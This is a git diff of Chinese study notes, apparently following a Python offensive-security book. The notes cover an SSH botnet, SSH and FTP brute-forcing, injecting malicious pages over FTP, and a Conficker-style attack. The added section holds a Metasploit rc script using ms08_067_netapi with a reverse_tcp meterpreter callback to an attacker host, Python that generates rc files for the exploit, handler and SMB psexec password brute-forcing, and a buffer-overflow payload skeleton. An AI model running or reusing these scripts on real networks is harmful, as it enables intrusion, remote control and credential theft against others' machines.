@@ -133,7 +133,7 @@ def nmap_scan(target_host, target_port):
     print("[*] {} tcp/{} {}".format(target_host, target_port, state))
 ```
 
-### 用 Python 构建一个 SSH 僵尸网络
+## 用 Python 构建一个 SSH 僵尸网络
 
 Morris 蠕虫有三种攻击方式，其中之一就是用常见的用户名和密码尝试登录 RSH 服务（remote shell）。RSH 是 1988 年问世的，它为系统管理员提供了一种很棒的远程连接一台机器，并能在主机上运行一系列终端命令对它进行管理的办法。
 
@@ -141,7 +141,7 @@ Morris 蠕虫有三种攻击方式，其中之一就是用常见的用户名和�
 
 SSH 蠕虫已经被证明是非常成功的和常见的攻击方式
 
-#### 用 Pexpect 与 SSH 交互
+### 用 Pexpect 与 SSH 交互
 
 为了能完成控制台交互过程，需要用 Pexpect 模块实现与程序交互、等待预期的屏幕输出等。
 
@@ -188,7 +188,7 @@ if __name__ == "__main__":
     send_command(child, "cat /etc/shadow | grep root")
 ```
 
-#### 用 Pxssh 暴力破解 ssh 密码
+### 用 Pxssh 暴力破解 ssh 密码
 
 Pxssh 导入方式：`import pexpect.pxssh`
 
@@ -287,7 +287,7 @@ if __name__ == "__main__":
 
 iPhone 设备上 root 用户的默认密码为：`alpine`，当设备越狱后，用户会在 iPhone 上启用一个 OpenSSH 服务
 
-#### 利用 SSH 中的弱私钥
+### 利用 SSH 中的弱私钥
 
 对于 SSH 服务器，密码验证并不是唯一的手段。除此之外，SSH 还能使用公钥加密的方式进行验证。在使用这一验证方法时，服务器和用户分别掌握公钥和私钥。使用 RSA 或是 RSA 算法，服务器能生成用于 SSH 登录的密钥。
 
@@ -365,7 +365,7 @@ if __name__ == "__main__":
     main()
 ```
 
-#### 构建 SSH 僵尸网络
+### 构建 SSH 僵尸网络
 
 每个单独的僵尸或者 client 都需要有能连上某台肉机，并把命令发送给肉机的能力
 
@@ -413,9 +413,9 @@ if __name__ == "__main__":
     bot_net_command("uname -v")
     bot_net_command("cat /etc/issue")
 ```
-### 利用 FTP 与 Web 批量抓 “肉机”
+## 利用 FTP 与 Web 批量抓 “肉机”
 
-#### 用 Python 构建匿名 FTP 扫描器
+### 用 Python 构建匿名 FTP 扫描器
 
 可以利用 Python 中的 ftplib 库编写一个小脚本，确定一个服务器是否允许匿名登录
 
@@ -438,13 +438,13 @@ if __name__ == "__main__":
     anon_login(host)
 ```
 
-#### 使用 Ftplib 暴力破解 FTP 用户口令
+### 使用 Ftplib 暴力破解 FTP 用户口令
 
 `FileZilla` 之类的 FTP 客户端程序往往将密码以明文形式存储在配置文件中
 
 只要将上面的 `ftp.login()` 替换上对应的用户名和密码就可以验证了
 
-#### 在 FTP 服务器上搜索网页
+### 在 FTP 服务器上搜索网页
 
 使用 `nlst` 函数，这会列出目录中所有文件的命令
 
@@ -452,7 +452,7 @@ if __name__ == "__main__":
 dir_list = ftp.nlst()
 ```
 
-#### 在网页中加入恶意注入代码
+### 在网页中加入恶意注入代码
 
 直接使用 `metasploit` 框架生成：
 
@@ -466,7 +466,7 @@ msfcli exploit/windows/browser/ms10_002_aurora
 ftp.storlines("STOR {}".format(page), open("{}.tmp".format(page)))
 ```
 
-#### 完整的代码 DEMO
+### 完整的代码 DEMO
 
 虽然很多余，但还是把整个流程打一遍吧
 
@@ -572,3 +572,115 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+## Conficker，为什么努力做就够了
+
+蠕虫病毒，Conficker（或称为 W32DownandUp），在其基本的感染方法中，Conficker 蠕虫使用了两种不同的攻击方法。首先利用了 Windows 服务器中一个服务的 0Day 漏洞。利用这个栈溢出漏洞，蠕虫能在被感染的主机上执行 ShellCode 并下载蠕虫。当这种攻击失败时，Conficker 蠕虫又尝试暴力破解默认的管理员网络共享（`ADMIN$`）的口令以获取肉机访问权。
+
+### 使用 Metasploit 攻击 Windows SMB 服务
+
+虽然攻击者可以通过交互驱动的方式使用 Metasploit，但 Metasploit 也能读取批处理脚本（rc）完成攻击。在攻击时，Metasploit 会顺序执行批处理文件中的命令。
+
+```shell
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 192.168.1.37
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.77.77
+set LPORT 7777
+exploit -j -z
+
+msfconsole -r conficker.rc
+> sessions -i 1
+> execute -i -f cmd.exe
+```
+
+### 编写 Python 脚本与 Metasploit 交互
+
+首先需要扫描网段内所有开放 445 端口的主机，TCP 445 端口主要是作为 SMB 协议的默认端口用的
+
+```python
+import nmap
+def find_target(sub_net):
+    nm_scan = nmap.PortScanner()
+    nm_scan.scan(sub_net, "445")
+    target_hosts = list()
+    for host in nm_scan.all_hosts():
+        if nm_scan[host].has_tcp(445):
+            state = nm_scan[host]["tcp"][445]["state"]
+            if state == "open":
+                print("[+] Found Target Host: {}".format(host))
+	return target_hosts
+```
+
+接下来需要编写一个监听器，这个监听器或称命令与控制信道，用于与目标主机进行远程交互
+
+Metasploit 提供了一个 Meterpreter 的高级动态负载，当 Meterpreter 进程回连接到攻击者的计算机等候执行进一步的命令时，要使用一个名为 `multi/handler` 的 Metasploit 模块去发布命令。接下来需要把各条指令写入 Metasploit 的 rc 脚本中
+
+```python
+def setup_handler(config_file, lhost, lport):
+    config_file.write("use exploit/multi/handler\n")
+    config_file.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
+    config_file.write("set LPORT {}\n".format(lport))
+    config_file.write("set LHOST {}\n".format(lhost))
+    config_file.write("exploit -j -z\n")
+    config_file.write("setg DisablePayloadHandler 1\n")
+```
+
+注意脚本发送了一条指令：在同一个任务（job）的上下文环境中（-j），不与任务进行即时交互的条件下（-z）利用目标计算机上的漏洞
+
+```python
+def conficker_exploit(config_file, target_host, lhost, lport):
+    config_file.write("use exploit/windows/smb/ms08_067_netapi\n")
+    config_file.write("set RHOST {}\n".format(target_host))
+    config_file.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
+    config_file.write("set LPORT {}\n".format(lport))
+    config_file.write("set LHOST {}\n".format(lhost))
+    config_file.write("exploit -j -z\n")
+```
+
+### 暴力破解口令，远程执行一个进程
+
+需要用暴力攻击的方式破解 SMB 用户名/密码，以此获取权限在目标主机上远程执行一个进程（psexec）
+
+```python
+def smb_brute(config_file, target_host, passwd_file, lhost, lport):
+    username = "Administrator"
+    pf = open(passwd_file, "r")
+    for password in pf.readlines():
+        password = password.strip("\r\n")
+        config_file.write("use exploit/windows/smb/psexec\n")
+        config_file.write("set SMBUser {}\n".format(username))
+        config_file.write("set SMBPass {}\n".format(password))
+        config_file.write("set RHOST {}\n")
+        config_file.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
+        config_file.write("set LPORT {}\n".format(lport))
+        config_file.write("set LHOST {}\n".format(lhost))
+        config_file.write("exploit -j -z\n")
+```
+
+### 整合
+
+最主要的是 main 函数如何与 metasploit 交互，发现是通过 rc 文件
+
+```python
+config_file = open("meta.rc", "w")
+...
+os.system("msfconsole -r meta.rc")
+```
+
+## 编写你自己的 0day 概念验证代码
+
+Morris 蠕虫成功的原因在某种程度上其实就是利用了 Finger service 中的一个基于栈的缓冲区溢出
+
+### 基于栈的缓冲区溢出攻击
+
+```python
+shellcode = ("\xbf\x5c....")
+overflow = "\x41" * 246
+ret = struct.pack("<L", 0x7c874413)
+padding = "\x90" * 150
+crash = overflow + ret + padding + shellcode
+```
+
+### 发送漏洞利用代码
+
+使用 `Berkeley Socket API` 发送，其实就是套接字发送，之前在学校课程已经接触过了，不记录了
